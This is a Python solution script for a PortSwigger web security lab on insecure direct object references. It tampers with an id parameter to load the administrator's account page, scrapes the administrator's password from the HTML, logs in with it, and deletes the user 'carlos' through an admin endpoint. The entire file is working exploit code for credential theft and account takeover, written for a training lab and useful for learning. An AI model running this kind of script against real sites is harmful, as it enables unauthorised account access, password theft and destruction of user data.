#!/usr/bin/env python3
# Lab: User ID controlled by request parameter with password disclosure
# Lab-Link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def get_password(client, host):
    url = f'{host}/my-account?id=administrator'

    text = client.get(url).text
    if 'Your username is: administrator' not in text:
        print(f'[-] Failed to access account page of administrator')
        return None

    soup = BeautifulSoup(text, 'html.parser')
    try:
        return soup.find('input', attrs={'name': 'password'})['value']
    except:  # noqa: E722
        print(f'[-] Failed to extract password from HTML source')

    return None


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    password = get_password(client, host)
    if not password:
        print(f'[-] Failed to extract administrator password')
        sys.exit(-2)
    print(f'[+] Extracted administrator password: {password}')

    if not login(client, host, 'administrator', password):
        print(f'[-] Failed to login as administrator')
        sys.exit(-3)
    print(f'[+] Logged in as administrator')

    r = client.get(f'{host}/admin/delete?username=carlos')
    if 'Congratulations, you solved the lab!' not in r.text:
        print(f'[-] Failed to delete user carlos')
        sys.exit(-4)

    print(f'[+] Deleted user carlos, lab solved')


if __name__ == "__main__":
    main()
